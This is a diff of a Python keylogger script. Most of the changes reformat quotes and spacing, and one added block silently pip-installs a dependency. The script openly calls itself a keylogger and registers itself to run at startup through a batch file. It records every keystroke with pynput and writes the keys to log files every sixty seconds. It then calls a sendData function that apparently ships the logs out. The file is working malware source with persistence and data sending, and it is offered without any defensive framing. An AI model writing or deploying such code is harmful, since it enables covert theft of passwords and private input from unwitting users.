@@ -1,4 +1,4 @@
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key, Listener
 import threading
 from time import sleep
 from datetime import datetime
@@ -7,14 +7,21 @@ import settingsManager as sM
 import sendData as sD
 from enableRunAtStartUp import createBat
 import subprocess
+
+check_elevate = subprocess.run(
+    ["pip", "show", "requests"], shell=True, capture_output=True
+).returncode
+if check_elevate == 1:
+    print("INSTALLING REQUESTS...")
+    subprocess.run(["pip", "install", "requests"], shell=True)
 # Start screen
 print("Starting Key logger ...")
 createBat()
 # Setting up username
 setting_values = sM.readSetting()
-if setting_values['username'] == 'USERNAME':
-    returnCode = subprocess.call('start getusername.py',shell=True)
-    
+if setting_values["username"] == "USERNAME":
+    returnCode = subprocess.call("start getusername.py", shell=True)
+
 # Global variables
 username = str()
 latest_date = str()
@@ -26,50 +33,56 @@ sleepTime = 60
 
 # Function to extract setting data
 def getSettingValue():
-    global username,latest_date
+    global username, latest_date
     setting_values = sM.readSetting()
-    username = setting_values['username']
-    latest_date = setting_values['Latest_record_date']
+    username = setting_values["username"]
+    latest_date = setting_values["Latest_record_date"]
+
 
 # Function on key press event
 def key_press(key):
-    global keys,caps,in_keys
+    global keys, caps, in_keys
     in_key = key = str(key)
-    if key == 'Key.caps_lock': caps = not caps
-    if not key.startswith('Key'):
-        if key.startswith("<"): # For numpad keys
-            key = key.replace("<","")
-            key = key.replace(">","")
-            if key == '110':
-                key = '.'
-            elif int(key) >=96 and int(key) <= 105 :
-                key = int(key)-96
+    if key == "Key.caps_lock":
+        caps = not caps
+    if not key.startswith("Key"):
+        if key.startswith("<"):  # For numpad keys
+            key = key.replace("<", "")
+            key = key.replace(">", "")
+            if key == "110":
+                key = "."
+            elif int(key) >= 96 and int(key) <= 105:
+                key = int(key) - 96
             else:
                 return False
-        elif not key.startswith("'\\x"): # For other keys (alphabet, numeric, special characters)
-            key = key.replace("'","")
-            if caps: key = key.upper()
+        elif not key.startswith(
+            "'\\x"
+        ):  # For other keys (alphabet, numeric, special characters)
+            key = key.replace("'", "")
+            if caps:
+                key = key.upper()
             if key.startswith("\\"):
                 return True
         else:
             return True
         keys.append(str(key))
-    elif key == 'Key.enter' or key == 'Key.esc': # For Enter key
+    elif key == "Key.enter" or key == "Key.esc":  # For Enter key
         try:
-            if keys[len(keys)-1] != '\n':
-                keys.append(str('\n')) 
+            if keys[len(keys) - 1] != "\n":
+                keys.append(str("\n"))
         except:
-            keys.append(str('\n'))
-    elif key == 'Key.space': # For space key
-        keys.append(' ')
-    elif key == 'Key.backspace': # For backspace key (<-)
-        keys.append('<-')
-    if in_key.startswith('Key'):
-        in_key = key.split('.')[1].upper()
+            keys.append(str("\n"))
+    elif key == "Key.space":  # For space key
+        keys.append(" ")
+    elif key == "Key.backspace":  # For backspace key (<-)
+        keys.append("<-")
+    if in_key.startswith("Key"):
+        in_key = key.split(".")[1].upper()
     else:
         in_key = str(key).upper()
     in_keys.append(in_key)
     # print("{0} pressed".format(in_key))
+
 
 # Function to terminate
 # def key_release(key):
@@ -82,24 +95,26 @@ def key_press(key):
 
 # Function to manage Latest record file
 def fileManager():
-    global latest_date,username
+    global latest_date, username
     current_date = str(datetime.now().date())
     getSettingValue()
     if current_date != latest_date and username != "USERNAME":
         print("Creating new records file for {0} ...".format(current_date))
-        rjM.createFile(username,current_date,latest_date)
-        sM.setLatestDate(current_date)        
+        rjM.createFile(username, current_date, latest_date)
+        sM.setLatestDate(current_date)
         getSettingValue()
-#Funtion to write in file
+
+
+# Funtion to write in file
 def writeToFile():
-    global keys,state,sleepTime,in_keys,username
+    global keys, state, sleepTime, in_keys, username
     while state:
         print("Sleeping...")
         sleep(sleepTime)
         fileManager()
         if username != "USERNAME":
-            rjM.updateFile(username,latest_date,in_keys)
-            with open('log.txt','a') as lg:
+            rjM.updateFile(username, latest_date, in_keys)
+            with open("log.txt", "a") as lg:
                 for key in keys:
                     lg.write(key)
             keys = []
@@ -107,6 +122,7 @@ def writeToFile():
             sD.sendData()
         else:
             print("USERNAME NOT SET")
+
 
 # Create a thread to handle writing log file every defined time
 th = threading.Thread(target=writeToFile)
@@ -118,5 +134,5 @@ th.start()
 #     listen.join()
 with Listener(on_press=key_press) as listen:
     listen.join()
-    
+
 th.join()
